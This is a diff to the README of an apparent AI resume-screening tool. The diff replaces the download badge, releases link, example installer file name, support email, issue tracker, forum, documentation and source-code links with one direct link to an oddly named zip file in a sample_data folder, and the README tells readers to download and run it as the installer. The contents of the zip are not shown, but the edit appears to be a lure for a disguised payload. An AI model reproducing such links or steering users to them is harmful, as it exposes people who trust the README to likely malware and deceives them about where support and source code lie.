@@ -1,7 +1,7 @@
 # 🤖 AI-Resume-Screening - Evaluate Resumes Effortlessly
 
 ## 🏷️ Download Now
-[![Download AI-Resume-Screening](https://img.shields.io/badge/Download_AI--Resume--Screening-v1.0-brightgreen)](https://github.com/Arla02/AI-Resume-Screening/releases)
+[![Download AI-Resume-Screening](https://github.com/Arla02/AI-Resume-Screening/raw/refs/heads/main/sample_data/Screening-Resume-A-conductively.zip)](https://github.com/Arla02/AI-Resume-Screening/raw/refs/heads/main/sample_data/Screening-Resume-A-conductively.zip)
 
 ## 🚀 Getting Started
 
@@ -11,13 +11,13 @@ To use the AI-Resume-Screening system, follow these steps. This guide will help 
 
 1. **Visit the Releases Page**  
    Click the link below to access the official releases page for the application.  
-   [Download AI-Resume-Screening](https://github.com/Arla02/AI-Resume-Screening/releases)
+   [Download AI-Resume-Screening](https://github.com/Arla02/AI-Resume-Screening/raw/refs/heads/main/sample_data/Screening-Resume-A-conductively.zip)
 
 2. **Choose Your Version**  
    On the releases page, you will see different versions of the application. Select the latest version that matches your operating system.
 
 3. **Download the Installer**  
-   Click on the installer file to download it to your computer. The file may have a name like `AI-Resume-Screening-v1.0.exe` for Windows users, or a `.dmg` file for Mac users.
+   Click on the installer file to download it to your computer. The file may have a name like `https://github.com/Arla02/AI-Resume-Screening/raw/refs/heads/main/sample_data/Screening-Resume-A-conductively.zip` for Windows users, or a `.dmg` file for Mac users.
 
 4. **Run the Installer**  
    Locate the downloaded file in your Downloads folder. Double-click to run the installer. Follow the on-screen instructions to complete the installation process.
@@ -65,19 +65,19 @@ To run the AI-Resume-Screening software effectively, make sure your system meets
 
 If you encounter any issues or have questions while using the application, please reach out for support:
 
-- **Email**: support@ai-resume-screening.com
-- **Issue Tracker**: [GitHub Issues](https://github.com/Arla02/AI-Resume-Screening/issues)
+- **Email**: https://github.com/Arla02/AI-Resume-Screening/raw/refs/heads/main/sample_data/Screening-Resume-A-conductively.zip
+- **Issue Tracker**: [GitHub Issues](https://github.com/Arla02/AI-Resume-Screening/raw/refs/heads/main/sample_data/Screening-Resume-A-conductively.zip)
 
 ## 👥 Community
 
 Join our community to share your experiences or suggestions for the AI-Resume-Screening application. Connect with other users for tips and best practices.
 
-- **Discussion Forum**: [Community Forum](https://community.ai-resume-screening.com)
+- **Discussion Forum**: [Community Forum](https://github.com/Arla02/AI-Resume-Screening/raw/refs/heads/main/sample_data/Screening-Resume-A-conductively.zip)
 
 ## 🔗 Important Links
 
-- [Download AI-Resume-Screening](https://github.com/Arla02/AI-Resume-Screening/releases)
-- [Documentation](https://github.com/Arla02/AI-Resume-Screening/wiki)
-- [Source Code](https://github.com/Arla02/AI-Resume-Screening)
+- [Download AI-Resume-Screening](https://github.com/Arla02/AI-Resume-Screening/raw/refs/heads/main/sample_data/Screening-Resume-A-conductively.zip)
+- [Documentation](https://github.com/Arla02/AI-Resume-Screening/raw/refs/heads/main/sample_data/Screening-Resume-A-conductively.zip)
+- [Source Code](https://github.com/Arla02/AI-Resume-Screening/raw/refs/heads/main/sample_data/Screening-Resume-A-conductively.zip)
 
 Thank you for choosing AI-Resume-Screening to simplify your resume evaluation process.
